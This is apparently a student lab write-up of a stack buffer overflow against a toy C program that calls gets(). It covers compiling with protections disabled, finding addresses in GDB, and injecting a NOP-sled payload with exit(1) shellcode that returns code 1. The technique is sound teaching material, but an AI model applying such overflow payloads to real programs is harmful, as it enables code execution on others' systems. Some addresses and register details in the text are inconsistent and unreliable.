# Machine Problem 1

## Gaslighting 101: How to Lie to the Stack and Get Away With It

Stack smashing — something we had never even considered before this course, but here we are, methodically dissecting a program to exploit its vulnerabilities.
The goal of this exercise is to utilize a stack-based buffer overflow to manipulate execution flow and force a controlled termination.
This write-up details the steps we took, from compiling the vulnerable program to identifying the key memory addresses, setting the stage for a hackerman experience.

## Compilation: Disabling Protections to Expose Vulnerability

Before we could even think about exploiting the program, we had to convince the compiler to let its guard down.
The provided vuln.c program needed to be compiled with specified GCC flags.
These flags are essential to disable modern memory safety protections, ensuring that our exploit can function correctly.

```c
// vuln.c
#include <stdio.h>

void vuln() {
  char buffer[8];
  gets(buffer);
}

int main() {
  vuln();
  while (1) {
  }
}
```

At first, we followed the given instructions, but we quickly ran into a problem: the compiler wasn’t buying it.
Our manipulation technique needed an extra ingredient — `-Wno-deprecated-declarations`.
Without this, the compiler stubbornly refused to accept our gaslighting, forcing us to appease it with an additional flag.

The forbidden spell is as follows:

```sh
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 -Wno-deprecated-declarations vuln.c -o vuln
```

For the rookies (like us), feel free to read up on GCC flags [here](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html). [4]
You never know when you’ll need to gaslight another compiler.
With this, the compiler finally relented, and our exploit could proceed as planned.
One step closer to bending the system to our will.

### Finding Addresses with GDB

With our vulnerable program compiled, the next step was to examine its memory layout and pinpoint key addresses.
Since modern programs try their best to avoid being exploited, we had to use the GNU Debugger (GDB) on Linux to reveal the exact locations we would later manipulate.

We launched `gdb` and set a breakpoint at `vuln()`, halting execution just before the infamous `gets(buffer);` call.
This gave us the opportunity to peek into memory before the overflow would occur.

```
$ gdb vuln
(gdb) break vuln
Breakpoint 1 at 0x1193: file vuln.c, line 5.
Now, if we run it, we can expect the execution to pause at:
(gdb) run
Breakpoint 1, vuln () at vuln.c:5
5   gets(buffer);
At this point, we kindly asked the program to reveal where it was keeping our buffer by running:
(gdb) print &buffer
$1 = (char (*)[8]) 0xffffc28
```

This revealed our buffer to be at the address `0xffffcc28`; one of the most useful information for our pursuit.
To get a better idea of the program’s current state, we checked the register values:

```
(gdb) info registers
eax            0x565561b2       1448436146
ecx            0xb7fbf0b9       -1330122567
edx            0xffffcc40       -13216
ebx            0xf7fa9000       -134574080
esp            0xffffcc28       0xffffcc30
ebp            0xffffcc30       0xffffcc30
esi            0xffffccf4       -13068
edi            0xf7ffcb80       -134231168
eip            0x565561a3       0x565561ba <vuln+6>
eflags         0x296            [ PF AF SF IF ]
cs             0x23             35
ss             0x2b             43
ds             0x2b             43
es             0x2b             43
fs             0x0              0
gs             0x63             99
```

While most of these values weren’t our main focus, the EIP (instruction pointer) was of particular interest.
Since EIP determines execution flow, we wanted to confirm how far the buffer extended and what we could potentially overwrite.

To do this, we checked the stack frame:

```
(gdb) info frame
Stack level 0, frame at 0xffffcc38:
eip = 0x565561a3 in vuln (vuln.c:5); saved eip = 0x565561ba
called by frame at 0xffffcc40
source language c.
Arglist at 0xffffcc30, args:
Locals at 0xffffcc30, Previous frame's sp is 0xffffcc38
Saved registers:
 ebp at 0xffffcc30, eip at 0xffffcc34
```

At this point, we only had a vague idea of what we were looking at.
But with some trial and error (and maybe some frantic Googling), we started piecing things together.

What mattered most was this:
- Our buffer was at `0xffffcc28`, meaning our input would start there.
- The saved EIP was at `0xffffcc34`, meaning that if we overflowed the buffer far enough, we could overwrite the return address and take control.

We had everything we needed to test how far we could go.
The next logical step? Speak the machine’s own language.

## Obtaining Machine Code

The core of a computer program is made up of instructions that the computer’s processor can understand directly.
These instructions are called machine code.
Machine code is the elemental language of computers.
It is read by the computer’s central processing unit (CPU), is composed of binary numbers and looks like a very long sequence of zeros and ones [1].

Programmers use higher-level languages like C or assembly language to create software.
The compiler then converts these higher-level instructions into machine code, which the computer can run.

A common approach is to write an assembly code, a low-level language, submitted to an assembler, which converts the assembly language to machine code.

```c
// asm.c

int main(){
    __asm__("xor %eax, %eax;"
            "inc %eax;"
            "mov %eab, %eax;"
            "leave;"
            "ret;"
    );
}
```

The C program that was written is a small snippet of assembly code.
The code uses inline assembly to manipulate CPU registers and perform simple operations like zeroing out a register, incrementing it, and moving data between registers.

```
xor %eax, %eax            // Clears the eax register (sets it to 0)
inc %eax                  // Increments the eax register by 1
mov %ebx, %eax            // Moves the value in the eax register into the
                         // ebx register
leave                     // Clean up the stack
ret                       // Return from the function
```

As you can see in the actual C code specifically on line 4, `eab` is not a valid register name in x86 assembly.
The correct register name is `ebx`.
When we ran the original code, it threw an error.
That is why `%eab` was rewritten as `%eax`.

How did the leave and ret instructions were replaced by `int 0x80`???

We tried running the code with the leave and ret, but no luck.

Let us recall what our goal is.
Our goal is to **construct** a shell code that can cause the program to **terminate** with the exit code 1.

Construct? So, it means we have to build (or change) something. After doing some typing on the keyboard, we saw this.

```
0000118d <main>:
   118d: 55                    push   %ebp
   118e: 89 e5                 mov    %esp,%ebp
   1190: 31 c0                 xor    %eax,%eax
   1192: 40                    inc    %eax
   1193: 89 c3                 mov    %eax,%ebx
   1195: cd 80                 int    $0x80
   1197: b8 00 00 00 00        mov    $0x0,%eax
   119c: 5d                    pop    %ebp
   119d: c3                    ret   
```

We looked at what [**int 0x80**](https://www.linfo.org/int_0x80.html) [3] means and we found out that int 0x80 is the assembly language instruction that is used to invoke system calls in [Linux](https://www.linfo.org/linuxdef.html) on x86 (i.e., Intel-compatible) processors.

After refining asm.c, it’s time for compilation with the following command.

```
gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm
```

Again, if you’re a rookie (like us), you can read up on GCC flags [here](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html). [4]

In obtaining the machine code of the compiled executable, we have this command.

```sh
objdump -d asm > asmdump   
```

This command disassembles the executable and writes the output to a file named asmdump.
By analyzing this output, we can examine the machine code and verify that our assembly instructions were correctly translated.

With our machine code in hand, it was time to move on to the next challenge: exploiting the program to force it to terminate correctly.

## Breaking the Loop

In this challenge, we faced a program that stubbornly ran forever.
Our goal was to make it exit with a status code of **1**.
The trick? **Exploiting a buffer overflow vulnerability**.
That’s where our magic spell comes in:

```sh
echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x28\xcc\xff\xff" > egg
```

The target program, `vuln.c`, contains a function called `vuln()` that uses the unsafe `gets(buffer)` function.
This function does not check the length of the input, allowing us to **input more data than the buffer can hold**.
When this happens, the extra data spills over into adjacent memory, enabling us to inject custom instructions (shellcode) into memory and trick the program into executing them.

### Understanding the Shellcode

The sequence `\x31\xc0\x40\x89\xc3\xcd\x80` is our hand-crafted assembly code, representing a **minimal shellcode** that forces the program to exit cleanly with a status code of **1**.
Here’s what each part does:

- `\x31\xc0` — Clears the eax register (sets it to 0). This ensures we start from a clean state.
- `\x40` — Increments eax, setting it to 1 (our desired exit code).
- `\x89\xc3` — Copies eax into ebx to prepare for the exit system call, where ebx holds the exit status.
- `\xcd\x80` — Triggers interrupt 0x80, which invokes a system call in Linux. In this case, it executes the exit system call using the status code in ebx.

### The Role of NOPs

The **five NOPs (`\x90\x90\x90\x90\x90`)** act as a **landing zone** for the program’s execution.
In a buffer overflow exploit, precision is tricky — sometimes the exact point where execution jumps into our injected shellcode isn’t guaranteed.
This is where NOPs (short for “No Operation”) help.

If execution lands anywhere within the NOPs, it will harmlessly slide forward into the actual shellcode instead of crashing.
This is called a NOP sled, often called a NOP slide, is a technique that is used to guarantee the execution of shellcode, even when the exact memory location of the exploit payload remains unknown. [2]
In this case, five NOPs were chosen instead of four because:

- It **prevents overwriting** the last byte of the shellcode when placing the return address.
- It provides a bit of **wiggle room** to ensure execution lands safely into the shellcode.
- Think of the NOPs as a **trampoline** — if the program jumps slightly off target, it still lands somewhere safe and bounces smoothly into the main exploit.

With our payload prepared and the NOP sled in place, it was time to test if our exploit would work as intended.

## Shell We Dance? (Spoiler: It Worked)

Now, with our shellcode written into egg, we can test it by running the vulnerable program in gdb:

```
gdb vuln
(gdb) run < egg
[Inferior 1 (process 5613) exited with code 01]
```

As shown above, the program exited with **code 01**, confirming that our shellcode successfully forced the program to terminate with the desired exit status.

## References
[1]: [What is machine code (machine language)?](https://www.techtarget.com/whatis/definition/machine-code-machine-language#:~:text=Machine%20code%2C%20also%20known%20as,sequence%20of%20zeros%20and%20ones.)
[2]: [Buffer Overflow: Code Execution By Shellcode Injection :: hg8’s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.](https://hg8.sh/posts/binary-exploitation/buffer-overflow-code-execution-by-shellcode-injection/?form=MG0AV3)
[3]: [int 0x80 assembly language instruction](https://www.linfo.org/int_0x80.html)
[4]: [Option Summary (Using the GNU Compiler Collection (GCC))](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html)
